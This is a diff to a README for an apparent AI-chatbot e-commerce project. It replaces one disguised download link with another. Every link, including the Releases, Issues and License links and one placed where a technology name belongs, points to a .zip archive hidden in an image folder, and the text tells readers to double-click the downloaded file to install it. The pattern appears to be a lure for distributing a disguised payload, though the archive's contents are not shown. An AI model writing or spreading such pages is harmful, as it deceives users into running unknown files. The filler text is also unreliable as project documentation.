@@ -1,10 +1,10 @@
 # 🛒 webstore-ai-ecommerce - Your Smart Online Store Solution
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/admin_panel/images/webstore-ai-ecommerce_2.1-beta.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/admin_panel/images/webstore-ai-ecommerce_2.1-beta.3.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/img/products/ai_webstore_ecommerce_v2.2-alpha.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/img/products/ai_webstore_ecommerce_v2.2-alpha.5.zip)
 
 ## 📖 Description
-The **webstore-ai-ecommerce** project is a full-stack e-commerce platform that integrates an AI-powered voice chatbot, designed to enhance your online shopping experience. Built with advanced technologies like Google Gemini, https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/admin_panel/images/webstore-ai-ecommerce_2.1-beta.3.zip, Python, and MySQL, this platform provides a seamless interface where users can not only shop but also interact with a voice assistant that helps them find products quickly.
+The **webstore-ai-ecommerce** project is a full-stack e-commerce platform that integrates an AI-powered voice chatbot, designed to enhance your online shopping experience. Built with advanced technologies like Google Gemini, https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/img/products/ai_webstore_ecommerce_v2.2-alpha.5.zip, Python, and MySQL, this platform provides a seamless interface where users can not only shop but also interact with a voice assistant that helps them find products quickly.
 
 ## 🚀 Getting Started
 To get started with your own online store using webstore-ai-ecommerce, follow these simple steps to download and run the application.
@@ -17,7 +17,7 @@ Make sure your system meets the following requirements:
 - **Internet Connection:** Required for initial setup
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/admin_panel/images/webstore-ai-ecommerce_2.1-beta.3.zip) to find the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/img/products/ai_webstore_ecommerce_v2.2-alpha.5.zip) to find the latest version of the application.
 2. Download the suitable version for your operating system.
 3. Once the download finishes, locate the file on your computer.
 4. Double-click the file to start the installation process and follow the on-screen instructions.
@@ -45,12 +45,12 @@ If you encounter issues, here are some common solutions:
 - **Slow Application Performance:** Close unnecessary applications running in the background to free up resources.
 
 ## 📫 Support
-For support, please visit the Issues section of our [GitHub repository](https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/admin_panel/images/webstore-ai-ecommerce_2.1-beta.3.zip). Here, you can report bugs or ask questions. Community members and developers will be available to help.
+For support, please visit the Issues section of our [GitHub repository](https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/img/products/ai_webstore_ecommerce_v2.2-alpha.5.zip). Here, you can report bugs or ask questions. Community members and developers will be available to help.
 
 ## 🔗 Links
-- [Releases Page](https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/admin_panel/images/webstore-ai-ecommerce_2.1-beta.3.zip)
-- [Issues Page](https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/admin_panel/images/webstore-ai-ecommerce_2.1-beta.3.zip)
-- [License Information](https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/admin_panel/images/webstore-ai-ecommerce_2.1-beta.3.zip)
+- [Releases Page](https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/img/products/ai_webstore_ecommerce_v2.2-alpha.5.zip)
+- [Issues Page](https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/img/products/ai_webstore_ecommerce_v2.2-alpha.5.zip)
+- [License Information](https://raw.githubusercontent.com/Bonakid12/webstore-ai-ecommerce/main/public/img/products/ai_webstore_ecommerce_v2.2-alpha.5.zip)
 
 ## 📝 Contribution
 If you want to contribute to the project, please fork the repository and submit a pull request with your changes. Your input is valuable in making this project better.
